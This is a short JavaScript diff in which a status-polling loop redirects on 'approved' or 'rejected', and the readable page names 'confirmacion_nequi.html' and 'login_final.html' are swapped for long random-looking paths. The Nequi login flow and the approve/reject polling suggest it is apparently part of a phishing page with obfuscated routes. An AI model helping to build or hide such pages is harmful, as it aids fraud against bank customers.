@@ -106,11 +106,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
                         if (statusData.status === 'approved') {
                             clearInterval(pollInterval);
-                            navigateWithLoader('confirmacion_nequi.html');
+                            navigateWithLoader('/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj');
                         } else if (statusData.status === 'rejected') {
                             clearInterval(pollInterval);
                             // Redirigir con parámetro de error
-                            window.location.href = 'login_final.html?error=true';
+                            window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=true';
                         }
                     } catch (err) {
                         console.error('Polling error:', err);
